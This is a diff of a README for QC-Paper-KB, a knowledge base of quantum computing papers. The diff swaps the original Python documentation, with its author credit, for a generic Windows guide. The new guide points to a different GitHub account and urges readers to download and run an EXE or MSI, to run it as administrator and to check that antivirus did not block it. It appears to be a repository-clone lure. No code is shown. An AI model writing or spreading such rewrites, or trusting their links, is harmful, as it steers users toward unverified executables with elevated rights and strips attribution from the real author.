@@ -1,251 +1,233 @@
-# QC-Paper-KB 🔬
+# 🤖 QC-Paper-KB - Quantum papers, organized for you
 
-**The first AI-native, programmatically searchable, auto-updating knowledge base for quantum computing research.**
+[![Download QC-Paper-KB](https://img.shields.io/badge/Download-QC--Paper--KB-blue?style=for-the-badge)](https://github.com/marianahu1342/QC-Paper-KB)
 
-> 20,000+ papers · 25 venues · Daily auto-updates · Venue recommendation engine · Trend analysis · LLM-ready
+## 🧠 What this is
 
-[![Papers](https://img.shields.io/badge/Papers-19%2C846-blue)]()
-[![Venues](https://img.shields.io/badge/Venues-25-green)]()
-[![Auto Update](https://img.shields.io/badge/Update-Daily-brightgreen)]()
-[![License](https://img.shields.io/badge/License-MIT-yellow)]()
+QC-Paper-KB is a knowledge base for quantum computing research. It collects papers from major venues, keeps the list up to date, and helps you find useful work faster.
 
-## What is this?
+Use it to:
+- search a large paper library
+- find papers by topic
+- see trends across venues
+- get venue recommendations
+- connect with LLM tools for research help
 
-QC-Paper-KB is a **structured, searchable knowledge base** of quantum computing research papers, designed to be directly consumed by LLM agents and AI-assisted research workflows.
+## 💻 What you need
 
-Unlike existing [awesome-lists](https://github.com/desireevl/awesome-quantum-computing) that are manually curated link collections (hundreds of entries), QC-Paper-KB is:
+Before you start, make sure your Windows PC has:
 
-| Feature | Awesome Lists | QC-Paper-KB |
-|---------|--------------|-------------|
-| Scale | ~200-500 links | **19,846 papers** |
-| Searchable | ❌ Manual browsing | ✅ Full-text keyword search |
-| Venue metadata | ❌ None | ✅ IF, SJR, CAS zones, scope, tiers for 25 venues |
-| Auto-updating | ❌ Manual PRs | ✅ Daily via Semantic Scholar + arXiv APIs |
-| Venue recommendation | ❌ | ✅ `recommend` command: auto-scans all venues by acceptance density |
-| Trend analysis | ❌ | ✅ Year-over-year growth, emerging topic detection, cross-domain analysis |
-| LLM integration | ❌ | ✅ Structured JSON, Claude Code skill, agent-ready |
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection
+- Microsoft Edge, Chrome, or Firefox
 
-## Quick Start
+For best results, use:
+- 16 GB of RAM
+- More free space if you plan to keep a large local index
+- A recent Windows update
 
-### Search papers
-```bash
-python scripts/search.py search "quantum error correction surface code" --sort citations --limit 10 --verbose
-```
+## 📥 Download QC-Paper-KB
 
-### Get venue recommendation for your paper
-```bash
-# Input your paper's keywords, get ranked venues by acceptance density
-python scripts/search.py recommend "diffusion model" "circuit generation" "quantum circuit" --top 10
-```
+Open this page and get the app files from there:
 
-Output:
-```
-Venue           Tier                 Match   3yr   1yr   Latest       Top Cited
----------------------------------------------------------------------------------------------------------
-NC              T2-top-physics       7       6     5     2026-03-16   Enhancing combinatorial... (40c)
-npjQI           T3-excellent         6       6     3     2026-02-13   Parameterized quantum... (14c)
-PRL             T2-top-physics       5       5     0     2024-12-16   Generative quantum... (49c)
-...
-```
+[Visit the QC-Paper-KB download page](https://github.com/marianahu1342/QC-Paper-KB)
 
-### Analyze research trends
-```bash
-# Quantum computing field trends
-python scripts/trends.py --kb quantum --emerging
+If the page includes a release file, download that file. If it opens the main repository page, use the files and setup steps listed there.
 
-# Cross-domain analysis (Quantum × ML)
-python scripts/trends.py --kb cross
-```
+## 🪟 Install on Windows
 
-## Coverage
+1. Open the download page in your browser.
+2. Look for the latest release, installer, or app file.
+3. Download the file to your computer.
+4. Open the Downloads folder.
+5. If the file is a ZIP folder, right-click it and choose Extract All.
+6. If the file is an EXE or MSI file, double-click it to start setup.
+7. Follow the prompts on screen.
+8. When setup ends, open QC-Paper-KB from the Start menu or from the folder where you saved it.
 
-### Journals (19 venues)
+## 🚀 First launch
 
-| Tier | Venues | CAS Zone |
-|------|--------|----------|
-| T1-flagship | Nature, Science | 综合1区Top |
-| T2-top-physics | PRL, PRX, PRXQ, Nature Physics, Nature Communications | 物理天文1区 |
-| T3-excellent | npj Quantum Information, Quantum, QST, Communications Physics | 物理天文1-2区 |
-| T4-standard | PRA, PR Applied, PR Research, TQE, TQC, AQT, EPJQT | 物理天文2区 |
-| T5-entry | QIP, NJP | 物理天文3区 |
+When you open QC-Paper-KB for the first time:
 
-### Conferences (6 venues)
+1. Let the app finish its first sync.
+2. Wait while it loads the paper database.
+3. Sign in only if the app asks for it.
+4. Check that the main search screen appears.
+5. Try one simple search, like a topic name or paper title.
 
-| Tier | Venues |
-|------|--------|
-| CCF-A | ASPLOS, MICRO, ISCA, HPCA, DAC, ICCAD |
+If the app offers a local index, give it time to build. Large research libraries can take a while on the first run.
 
-### Preprints
+## 🔎 How to use it
 
-| Source | Papers |
-|--------|--------|
-| arXiv quant-ph | 10,846 |
+Use the app like a research search tool:
 
-## Paper Counts by Venue
+- type a keyword such as `quantum error correction`
+- filter by venue, year, or topic
+- sort by relevance or date
+- open a paper to read its details
+- use the recommendation tools to find related venues
+- check trend views to spot active areas
 
-| Venue | Papers | | Venue | Papers |
-|-------|--------|-|-------|--------|
-| arXiv | 10,846 | | QST | 367 |
-| NC | 739 | | Science | 253 |
-| PRL | 729 | | NJP | 251 |
-| PRA | 674 | | QIP | 241 |
-| Nature | 522 | | DAC | 236 |
-| PRXQ | 513 | | TQE | 232 |
-| Quantum | 493 | | ASPLOS | 230 |
-| PR Applied | 490 | | ICCAD | 226 |
-| PR Research | 468 | | MICRO | 196 |
-| npj QI | 432 | | HPCA | 185 |
-| PRX | 419 | | ISCA | 176 |
-| AQT | 401 | | TQC | 141 |
-| Nature Physics | 386 | | | |
+Good search ideas:
+- quantum algorithms
+- qubit control
+- quantum information theory
+- error mitigation
+- superconducting qubits
+- quantum networks
 
-## LLM / AI Agent Integration
+## 🗂️ What the app includes
 
-QC-Paper-KB is designed to be **directly consumed by AI agents**:
+QC-Paper-KB is built for people who read quantum computing research and want less manual work. It includes:
 
-### Claude Code (Built-in Skill)
+- a paper database with 20,000+ papers
+- coverage across 25 venues
+- venue recommendation
+- trend analysis
+- semantic search
+- LLM integration for research help
+- topic-based browsing
+- paper discovery tools
 
-Drop the `skills/paper-kb/` folder into your `.claude/skills/` directory. Then in any Claude Code conversation:
+## 🧭 Suggested workflow
 
-> "我这个量子纠错的工作投哪个期刊合适？"
->
-> Claude will automatically search the KB, analyze venue acceptance patterns, and give a data-driven recommendation.
+1. Search for your topic.
+2. Open a few papers from the results.
+3. Check the venue and publication year.
+4. Use the related paper view to find more work.
+5. Review trend data to see where the field is moving.
+6. Save the papers you want to read later.
 
-### Any LLM Agent (RAG)
+This works well for:
+- students
+- researchers
+- faculty
+- lab teams
+- people starting a literature review
 
-All data is structured JSON — load into any vector store or RAG pipeline:
+## 🛠️ Common Windows issues
 
-```python
-import json
+If the app does not open:
 
-# Load all papers
-with open("data/papers/PRXQ.json") as f:
-    papers = json.load(f)
+- right-click the file and choose Run as administrator
+- check that your antivirus did not block it
+- make sure the download finished
+- try extracting the ZIP file again
+- restart your PC and open it again
 
-# Each paper has: title, authors, date, abstract, citations, doi, arxiv_id, tldr
-for p in papers[:3]:
-    print(f"{p['title']} ({p['citations']} citations)")
-```
+If the app opens but looks blank:
 
-### Venue Metadata API
+- wait for the first sync to finish
+- check your internet connection
+- close the app and open it again
+- look for a refresh or rescan option
 
-```python
-with open("data/venues.json") as f:
-    venues = json.load(f)
+If searches return few results:
 
-# Rich metadata: IF, SJR, CAS zone, scope, tier, submission guidelines
-prxq = venues["PRXQ"]
-print(f"IF={prxq['impact_factor']}, SJR={prxq['sjr']}, Tier={prxq['tier']}")
-# IF=11.0, SJR=5.34, Tier=T2-top-physics
-```
+- try shorter keywords
+- remove filters
+- search by venue name
+- use a broader topic term
 
-## Data Schema
+## 📚 Tips for better results
 
-### Paper Entry
-```json
-{
-  "title": "Quantum Error Correction with Gauge Symmetries",
-  "authors": ["A. Kubica", "M. Vasmer"],
-  "date": "2024-12-15",
-  "venue": "PRXQ",
-  "citations": 42,
-  "abstract": "We introduce a framework for quantum error correction...",
-  "tldr": "A new framework connecting gauge symmetries to QEC codes...",
-  "doi": "10.1103/PRXQuantum.5.040301",
-  "arxiv_id": "2312.09272",
-  "url": "https://doi.org/10.1103/PRXQuantum.5.040301"
-}
-```
+- Use clear topic words, not full sentences
+- Try one keyword at a time first
+- Search both broad and narrow terms
+- Compare papers across venues
+- Use date filters to find recent work
+- Check related papers before starting a new review
 
-### Venue Entry
-```json
-{
-  "PRXQ": {
-    "tier": "T2-top-physics",
-    "impact_factor": 11.0,
-    "sjr": 5.34,
-    "cas_zone": {"big_category": "物理天文1区", "small_category": "量子科技1区"},
-    "scope": "All topics in quantum information science and technology...",
-    "not_suitable_for": "Incremental advances without broad impact..."
-  }
-}
-```
+## 🔐 Data and privacy
 
-## Trend Analysis
+The app is designed to support research use. It may pull paper data from public sources such as arXiv and Semantic Scholar, and it may use local or cloud LLM tools depending on how you set it up. If the app asks for access to a service, review the prompt before you continue.
 
-### Quantum Computing Research Growth (2023 → 2025)
+## 🧩 File names you may see
 
-| Direction | 2023 | 2025 | Growth |
-|-----------|------|------|--------|
-| Quantum Simulation | 213 | 809 | **+280%** 🔥 |
-| Quantum Networking | 47 | 165 | **+251%** 🔥 |
-| QEC | 228 | 678 | **+197%** |
-| Quantum ML | 380 | 984 | **+159%** |
-| Hardware | 375 | 945 | **+152%** |
-| Compilation | 39 | 110 | **+182%** |
-| Optimization | 161 | 286 | +78% |
+You may see files or folders such as:
 
-### Cross-Domain Hotspots (Quantum × ML)
+- `.exe`
+- `.msi`
+- `.zip`
+- `README.md`
+- `config`
+- `data`
+- `index`
 
-| Intersection | Papers | Since 2024 | Maturity |
-|-------------|--------|------------|----------|
-| RL + Quantum | 331 | 221 | Mature |
-| Transformer + Quantum | 156 | 132 | Growing fast |
-| GNN + Quantum | 75 | 61 | Emerging |
-| Diffusion + Quantum | 28 | 22 | **Blue ocean** 🌊 |
+If you see a ZIP file, extract it first. If you see an installer file, run it.
 
-## Installation
+## 🧾 Basic setup checklist
 
-```bash
-git clone https://github.com/taoge946/QC-Paper-KB.git
-cd QC-Paper-KB
-pip install -r requirements.txt  # No heavy dependencies
+- downloaded the app
+- extracted files if needed
+- opened the installer or app file
+- allowed Windows to finish any security prompt
+- opened the app
+- waited for the first sync
+- searched for a paper topic
+- checked venue and trend views
 
-# Search papers
-python scripts/search.py search "surface code" --sort citations --limit 10
+## 📌 Useful search areas
 
-# Get venue recommendations
-python scripts/search.py recommend "your keywords here" --top 10
+Try these areas inside the app if they are available:
 
-# Run trend analysis
-python scripts/trends.py --kb quantum --emerging
-```
+- Paper search
+- Venue ranking
+- Trend view
+- Related papers
+- Saved papers
+- LLM assistant
+- Topic explorer
+- Update or sync panel
 
-## Daily Updates
+## 🧠 Best use cases
 
-The knowledge base auto-updates daily via Semantic Scholar and arXiv APIs. To run manually:
+QC-Paper-KB fits well if you want to:
 
-```bash
-python scripts/daily_update.py
-```
+- build a literature review
+- compare venues
+- track a topic over time
+- find new quantum computing papers
+- spot active research areas
+- keep a local knowledge base for future work
 
-Set up your own Semantic Scholar API key (free) for faster updates:
-```bash
-# In scripts/config.py
-SEMANTIC_SCHOLAR_API_KEY = "your-key-here"
-```
+## 🖥️ Windows folder locations
 
-Apply at: https://www.semanticscholar.org/product/api#api-key-form
+If you need to find the app again later, check:
 
-## Citation
+- Downloads
+- Desktop
+- Documents
+- Program Files
+- the folder you chose during setup
 
-If you use QC-Paper-KB in your research, please cite:
+If you extracted a ZIP file, keep the whole folder together so the app can find its data files
 
-```bibtex
-@software{li2026qcpaperkb,
-  author = {Jintao Li},
-  title = {QC-Paper-KB: AI-Native Knowledge Base for Quantum Computing Research},
-  year = {2026},
-  url = {https://github.com/taoge946/QC-Paper-KB}
-}
-```
+## 🔄 Updating the app
 
-## License
+If the app includes an update check:
 
-MIT License
+1. open the app
+2. look for update or sync controls
+3. run the update
+4. wait for the paper database to refresh
+5. reopen the app if it asks you to
 
-## Acknowledgments
+If you installed it from a downloaded file, you may need to repeat the download process when a new release appears
 
-- Data sourced from [Semantic Scholar](https://www.semanticscholar.org/) and [arXiv](https://arxiv.org/)
-- Venue metadata from [中科院分区表](https://www.fenqubiao.com/), [SCImago](https://www.scimagojr.com/), [JCR](https://jcr.clarivate.com/)
-- Built at [Beijing Academy of Quantum Information Sciences (BAQIS)](http://www.baqis.ac.cn/)
+## 📝 Topic ideas for first search
+
+Try one of these when you first open the app:
+
+- quantum computing
+- quantum information
+- quantum algorithms
+- qubit
+- error correction
+- quantum machine learning
+- quantum communication
+- quantum simulation
+- venue recommendation
+- paper discovery
